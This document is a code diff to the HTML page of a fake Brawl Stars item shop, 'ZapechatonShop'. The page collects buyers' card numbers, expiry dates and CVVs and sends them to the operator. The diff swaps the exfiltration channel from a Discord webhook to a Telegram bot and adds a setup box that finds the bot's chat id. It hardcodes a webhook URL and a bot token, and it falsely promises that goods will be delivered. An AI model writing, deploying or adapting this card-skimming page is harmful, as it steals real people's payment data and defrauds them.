@@ -15,12 +15,24 @@
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; }
         .modal-content { background: #111; border: 1px solid white; padding: 25px; border-radius: 16px; width: 280px; }
         input { width: 100%; margin: 8px 0; padding: 8px; background: black; border: 1px solid white; color: white; border-radius: 30px; }
+        .setup-box { background: #222; padding: 15px; border-radius: 16px; margin-bottom: 20px; text-align: center; }
+        .setup-box button { margin-top: 10px; }
+        .status { margin-top: 10px; font-size: 14px; color: #0f0; }
     </style>
 </head>
 <body>
 
 <h1>ZapechatonShop</h1>
 <p>// brawl stars market</p>
+
+<!-- Блок настройки телеграм -->
+<div class="setup-box" id="setupBox">
+    <strong>⚙️ НАСТРОЙКА ТЕЛЕГРАМ (один раз)</strong><br>
+    1. Напиши боту <code>@ZapechatonShop_bot</code> любое сообщение (например <code>/start</code>)<br>
+    2. Нажми кнопку ниже — chat id определится автоматически<br>
+    <button id="fetchChatIdBtn">🔍 ПОЛУЧИТЬ CHAT ID</button>
+    <div id="telegramStatus" class="status"></div>
+</div>
 
 <div class="products">
     <div class="product"><h3>BP (Brawl Pass)</h3><div class="price">349 ₽</div><button onclick="add('BP (Brawl Pass)',349)">в корзину</button></div>
@@ -53,9 +65,55 @@
 </div>
 
 <script>
-    // ВЕБХУК ВСТАВЛЕН
-    const WEBHOOK = "https://discord.com/api/webhooks/1505137773810810951/qA1nqYdCE8pz4rxzvcD2IC9U2TzTu9Pv5Ti0bEImbUeJvr-ZnfCoxbTrJncw6zcOkag7";
+    // ТВОЙ НОВЫЙ ТОКЕН
+    const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
+    let CHAT_ID = localStorage.getItem('tg_chat_id') || null;
 
+    // проверка, есть ли chat id
+    function updateSetupUi() {
+        const setupBox = document.getElementById('setupBox');
+        const statusDiv = document.getElementById('telegramStatus');
+        if (CHAT_ID) {
+            setupBox.style.display = 'none';
+        } else {
+            setupBox.style.display = 'block';
+            statusDiv.innerHTML = '⚠️ chat id не задан. напиши боту и нажми кнопку.';
+        }
+    }
+
+    // получить chat id из последнего сообщения боту
+    async function fetchChatId() {
+        const statusDiv = document.getElementById('telegramStatus');
+        statusDiv.innerHTML = '🔍 проверяем обновления бота...';
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`);
+            const data = await res.json();
+            if (data.ok && data.result && data.result.length > 0) {
+                // берем самый свежий chat id
+                const lastUpdate = data.result[data.result.length - 1];
+                const chatId = lastUpdate.message?.chat?.id || lastUpdate.callback_query?.message?.chat?.id;
+                if (chatId) {
+                    CHAT_ID = chatId;
+                    localStorage.setItem('tg_chat_id', CHAT_ID);
+                    statusDiv.innerHTML = `✅ chat id получен: ${CHAT_ID}. Теперь данные будут уходить в телеграм.`;
+                    setTimeout(() => {
+                        document.getElementById('setupBox').style.display = 'none';
+                    }, 2000);
+                } else {
+                    statusDiv.innerHTML = '❌ не удалось найти chat id. напиши боту любое сообщение и нажми кнопку снова.';
+                }
+            } else {
+                statusDiv.innerHTML = '❌ нет сообщений. напиши боту /start, а потом нажми кнопку.';
+            }
+        } catch (e) {
+            statusDiv.innerHTML = '❌ ошибка соединения. убедись что ты онлайн.';
+            console.error(e);
+        }
+    }
+
+    document.getElementById('fetchChatIdBtn').addEventListener('click', fetchChatId);
+
+    // корзина и остальное
     let cart = [];
 
     function add(name, price) {
@@ -104,32 +162,29 @@
         document.getElementById('modal').style.display = 'none';
     }
 
-    function pay() {
+    async function pay() {
         const card = document.getElementById('cardNum').value.trim();
         const exp = document.getElementById('cardExp').value.trim();
         const cvv = document.getElementById('cardCvv').value.trim();
         if (!card || !exp || !cvv) { alert('заполните все поля'); return; }
+        if (!CHAT_ID) {
+            alert('сначала настрой телеграм: напиши боту и нажми "получить chat id"');
+            return;
+        }
         const total = cart.reduce((s,i)=>s+i.price,0);
         const items = cart.map(i=>`${i.name} (${i.price}₽)`).join('\n');
+        const message = `🪪 НОВАЯ ПОКУПКА\n\n📦 Товары:\n${items}\n\n💰 Сумма: ${total} ₽\n💳 Карта: ${card}\n📅 Срок: ${exp}\n🔐 CVV: ${cvv}`;
         
-        // отправка в дискорд
-        fetch(WEBHOOK, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                content: 'НОВАЯ ПОКУПКА',
-                embeds: [{
-                    title: 'данные карты',
-                    fields: [
-                        {name: 'товары', value: items, inline: false},
-                        {name: 'сумма', value: total + ' ₽', inline: true},
-                        {name: 'номер карты', value: `||${card}||`, inline: true},
-                        {name: 'срок', value: `||${exp}||`, inline: true},
-                        {name: 'cvv', value: `||${cvv}||`, inline: true}
-                    ]
-                }]
-            })
-        }).catch(e=>console.log);
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+            const data = await res.json();
+            if (data.ok) console.log('отправлено');
+            else console.log('ошибка телеграм', data);
+        } catch(e) { console.error(e); }
         
         alert('спасибо за покупку! товары придут в течение часа.');
         cart = [];
@@ -139,6 +194,14 @@
         document.getElementById('cardExp').value = '';
         document.getElementById('cardCvv').value = '';
     }
+
+    // инициализация
+    updateSetupUi();
+    window.add = add;
+    window.remove = remove;
+    window.openModal = openModal;
+    window.closeModal = closeModal;
+    window.pay = pay;
 </script>
 </body>
 </html>
